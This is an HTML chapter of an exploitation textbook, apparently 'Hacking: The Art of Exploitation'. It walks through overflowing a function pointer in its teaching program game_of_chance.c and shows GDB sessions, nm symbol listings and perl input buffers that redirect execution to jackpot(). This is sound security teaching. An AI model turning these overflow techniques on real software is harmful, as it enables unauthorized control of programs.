<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x342 Overflowing Function Pointers</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part59.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part61.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark50">0x342 Overflowing Function Pointers</a></p><p style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">If you have played with the game_of_chance.c program enough, you will realize that, similar to at a casino, most of the games are statistically weighted in favor of the house. This makes winning credits difficult, despite how lucky you might be. Perhaps there’s a way to even the odds a bit. This program uses a function pointer to remember the last game played. This pointer is stored in the <span class="s31">user </span>structure, which is declared as a global variable. This means all the memory for the user structure is allocated in the bss segment.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From game_of_chance.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_465.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">// Custom user struct to store information about users struct user {</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int uid; int credits;</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">int highscore; char name[100];</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int (*current_game) ();</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">};</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">// Global variables</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">struct user player;   // Player struct</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_466.png"/></span></p><p style="padding-top: 7pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">The name buffer in the user structure is a likely place for an overflow.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">This buffer is set by the <span class="s31">input_name() </span>function, shown below:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_467.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">// This function is used to input the player name, since</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">// scanf(&quot;%s&quot;, &amp;whatever) will stop input at the first space. void input_name() {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">char *name_ptr, input_char=&#39;\n&#39;;</p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">while(input_char == &#39;\n&#39;)  // Flush any leftover scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">name_ptr = (char *) &amp;(player.name); // name_ptr = player name&#39;s address while(input_char != &#39;\n&#39;) { // Loop until newline.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 107%;text-align: left;">*name_ptr = input_char;  // Put the input char into name field. scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">name_ptr++;       // Increment the name pointer.</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">*name_ptr = 0; // Terminate the string.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_468.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This function only stops inputting at a newline character. There is nothing to limit it to the length of the destination name buffer, meaning an overflow is possible. In order to take advantage of the overflow, we need to make the program call the function pointer after it is overwritten. This happens in the <span class="s31">play_the_game() </span>function, which is called when any game is selected from the menu. The following code snippet is part of the menu selection code, used for picking and playing a game.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_469.png"/></span></p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">if((choice &lt; 1) || (choice &gt; 7))</p><p class="s31" style="padding-left: 116pt;text-indent: 12pt;line-height: 107%;text-align: left;">printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice); else if (choice &lt; 4) { // Otherwise, choice was a game of some sort.</p><p class="s31" style="padding-left: 155pt;text-indent: -12pt;text-align: left;">if(choice != last_game) { // If the function ptr isn&#39;t set, if(choice == 1)     // then point it at the selected game</p><p class="s31" style="padding-left: 155pt;text-indent: 12pt;line-height: 107%;text-align: left;">player.current_game = pick_a_number; else if(choice == 2)</p><p class="s31" style="padding-left: 155pt;text-indent: 12pt;text-align: left;">player.current_game = dealer_no_match; else</p><p class="s31" style="padding-left: 155pt;text-indent: 12pt;line-height: 107%;text-align: left;">player.current_game = find_the_ace; last_game = choice;  // and set last_game.</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 142pt;text-indent: 0pt;text-align: left;">play_the_game();  // Play the game.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 129pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_470.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">If <span class="s31">last_game </span>isn’t the same as the current choice, the function pointer of <span class="s31">current_game </span>is changed to the appropriate game. This means that in order to get the program to call the function pointer without overwriting it, a game must be played first to set the <span class="s31">last_game </span>variable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_471.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./game_of_chance</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: Jon Erickson]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 70 credits] -&gt; 1</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048fde ####### Pick a Number ######</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 8pt;text-align: left;">This game costs 10 credits to play. Simply pick a number</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">between 1 and 20, and if you pick the winning number, you will win the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10 credits have been deducted from your account. Pick a number between 1 and 20: 5</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The winning number is 17 Sorry, you didn&#39;t win.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 60 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Would you like to play again? (y/n) n</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Name: Jon Erickson] [You have 60 credits] -&gt;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[1]+ Stopped        ./game_of_chance reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_472.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">You can temporarily suspend the current process by pressing <span class="s7">CTRL</span>-Z. At this point, the <span class="s31">last_game </span>variable has been set to 1, so the next time 1 is selected, the function pointer will simply be called without being changed. Back at the shell, we figure out an appropriate overflow buffer, which can be copied and pasted in as a name later. Recompiling the source with debugging symbols and using GDB to run the program with a breakpoint on <span class="s31">main() </span>allows us to explore the memory. As the output below shows, the name buffer is 100 bytes from the <span class="s31">current_game </span>pointer within the user</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">structure.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_473.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g game_of_chance.c reader@hacking:~/booksrc $ gdb -q ./a.out</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) break main</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048813: file game_of_chance.c, line 41. (gdb) run</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Starting program: /home/reader/booksrc/a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main () at game_of_chance.c:41</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">41     srand(time(0)); // Seed the randomizer with the current time. (gdb) p player</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$1 = {uid = 0, credits = 0, highscore = 0, name = &#39;\0&#39; &lt;repeats 99 times&gt;, current_game = 0}</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) x/x &amp;player.name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">0x804b66c &lt;player+12&gt;: 0x00000000 (gdb) x/x &amp;player.current_game 0x804b6d0 &lt;player+112&gt;: 0x00000000 (gdb) p 0x804b6d0 - 0x804b66c</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$2 = 100</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">The program is running. Exit anyway? (y or n) y reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_474.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Using this information, we can generate a buffer to overflow the name variable with. This can be copied and pasted into the interactive Game of Chance program when it is resumed. To return to the suspended process, just type <span class="s31">fg</span>, which is short for <span class="s27">foreground</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_475.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAABBBB</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ fg</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">./game_of_chance 5</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Change user name</p><p class="s31" style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Enter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Your name has been changed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[You have 60 credits] -&gt; 1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] current_game pointer @ 0x42424242 Segmentation fault reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_476.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Select menu option 5 to change the username, and paste in the overflow buffer. This will overwrite the function pointer with <span class="s31">0x42424242</span>. When menu option 1 is selected again, the program will crash when it tries to call the function pointer. This is proof that execution can be controlled; now all that’s needed is a valid address to insert in place of <span class="s27">BBBB</span>.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The <span class="s31">nm </span>command lists symbols in object files. This can be used to find</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">addresses of various functions in a program.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_477.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nm game_of_chance 0804b508 d _DYNAMIC</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0804b5d4 d _GLOBAL_OFFSET_TABLE_</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080496c4 R _IO_stdin_used</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">w _Jv_RegisterClasses 0804b4f8 d <u>&nbsp;</u>CTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0804b4f4 d <u>&nbsp;</u>CTOR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804b500 d <u>&nbsp;</u>DTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804b4fc d <u>&nbsp;</u>DTOR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804a4f0 r <u>&nbsp;</u>FRAME_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804b504 d <u>&nbsp;</u>JCR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804b504 d <u>&nbsp;</u>JCR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">0804b630 A <u>&nbsp;</u>bss_start 0804b624 D <u>&nbsp;</u>data_start</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08049670 t <u>&nbsp;</u>do_global_ctors_aux</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">08048610 t <u>&nbsp;</u>do_global_dtors_aux 0804b628 D <u>&nbsp;</u>dso_handle</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 106%;text-align: left;">w <u>&nbsp; </u>gmon_start<u>  </u> 08049669 T <u>&nbsp; </u>i686.get_pc_thunk.bx 0804b4f4 d <u>&nbsp; </u>init_array_end 0804b4f4 d <u>&nbsp; </u>init_array_start 080495f0 T <u>&nbsp; </u>libc_csu_fini 08049600 T <u>&nbsp; </u>libc_csu_init</p><p class="s31" style="padding-left: 129pt;text-indent: 0pt;text-align: left;">U <u>&nbsp;</u>libc_start_main@@GLIBC_2.0</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">0804b630 A _edata 0804b6d4 A _end 080496a0 T _fini 080496c0 R _fp_hw 08048484 T _init 080485c0 T _start</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080485e4 t call_gmon_start</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 106%;text-align: left;">U close@@GLIBC_2.0 0804b640 b completed.1 0804b624 W data_start 080490d1 T dealer_no_match 080486fc T dump</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080486d1 T ec_malloc</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U exit@@GLIBC_2.0 08048684 T fatal</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">080492bf T find_the_ace 08048650 t frame_dummy 080489cc T get_player_data</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U getuid@@GLIBC_2.0 08048d97 T input_name 08048d70 T jackpot</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08048803 T main</p><p class="s31" style="padding-left: 129pt;text-indent: 0pt;line-height: 107%;text-align: left;">U malloc@@GLIBC_2.0 U open@@GLIBC_2.0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0804b62c d p.0</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U perror@@GLIBC_2.0 08048fde T pick_a_number 08048f23 T play_the_game 0804b660 B player</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08048df8 T print_cards</p><p class="s31" style="padding-left: 129pt;text-indent: 0pt;line-height: 107%;text-align: left;">U printf@@GLIBC_2.0 U rand@@GLIBC_2.0 U read@@GLIBC_2.0</p><p class="s31" style="padding-left: 129pt;text-indent: -38pt;line-height: 107%;text-align: left;">08048aaf T register_new_player U scanf@@GLIBC_2.0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08048c72 T show_highscore</p><p class="s31" style="padding-left: 129pt;text-indent: 0pt;text-align: left;">U srand@@GLIBC_2.0 U strcpy@@GLIBC_2.0</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U strncat@@GLIBC_2.0 08048e91 T take_wager</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;text-align: left;">U time@@GLIBC_2.0 08048b72 T update_player_data</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U write@@GLIBC_2.0 reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_478.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">The <span class="s31">jackpot() </span>function is a wonderful target for this exploit. Even though the games give terrible odds, if the <span class="s31">current_game </span>function pointer is carefully overwritten with the address of the <span class="s31">jackpot() </span>function, you won’t even have to play the game to win credits. Instead, the <span class="s31">jackpot() </span>function will just be called directly, doling out the reward of 100 credits and tipping the scales in the player’s direction.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">This program takes its input from standard input. The menu selections can be scripted in a single buffer that is piped to the program’s standard</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">input. These selections will be made as if they were typed. The following example will choose menu item 1, try to guess the number 7, select <span class="s31">n </span>when asked to play again, and finally select menu item 7 to quit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_479.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;1\n7\nn\n7\n&quot;&#39; | ./game_of_chance</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Name: Jon Erickson] [You have 60 credits] -&gt;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] current_game pointer @ 0x08048fde</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">####### Pick a Number ######</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">This game costs 10 credits to play. Simply pick a number between 1 and 20, and if you pick the winning number, you will win the jackpot of 100 credits!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10 credits have been deducted from your account.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Pick a number between 1 and 20: The winning number is 20 Sorry, you didn&#39;t win.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">You now have 50 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Would you like to play again? (y/n) -=[ Game of Chance Menu ]=- 1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">[Name: Jon Erickson] [You have 50 credits] -&gt; Thanks for playing! Bye.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_480.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">This same technique can be used to script everything needed for the exploit. The following line will play the Pick a Number game once, then change the username to 100 <span class="s27">A</span>’s followed by the address of the <span class="s31">jackpot() </span>function. This will overflow the <span class="s31">current_game </span>function pointer, so when the Pick a Number game is played again, the <span class="s31">jackpot() </span>function is called directly.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_481.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\ x8d\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">n 5</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAp?</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">n 7</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\ x8d\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&#39; | ./game_of_chance</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-=[ Game of Chance Menu ]=-</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 - Play the Pick a Number game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2 - Play the No Match Dealer game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3 - Play the Find the Ace game</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4 - View current high score</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5 - Change your user name</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 - Reset your account at 100 credits</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7 - Quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[Name: Jon Erickson] [You have 50 credits] -&gt;</p><p class="s31" style="padding-left: 